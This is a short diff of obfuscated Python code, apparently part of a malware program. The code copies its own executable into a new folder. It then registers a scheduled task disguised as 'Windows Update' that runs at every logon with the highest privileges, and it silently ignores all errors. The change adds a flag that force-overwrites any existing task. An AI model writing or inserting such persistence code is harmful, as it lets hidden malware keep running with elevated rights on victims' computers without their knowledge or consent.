@@ -65,7 +65,7 @@ def hzirge():
         x5g4g654z654 = ewsjinf783.path.join(awdt553234, xcsgf4)
         ewsjinf783.makedirs(x5g4g654z654, exist_ok=True)
         euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(x5g4g654z654))
-        xvcj5tr.run(f'schtasks /create /tn "Windows Update" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, capture_output=False)
+        xvcj5tr.run(f'schtasks /create /tn "Windows Update" /f /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, capture_output=False)
         
     except Exception as e:
         pass
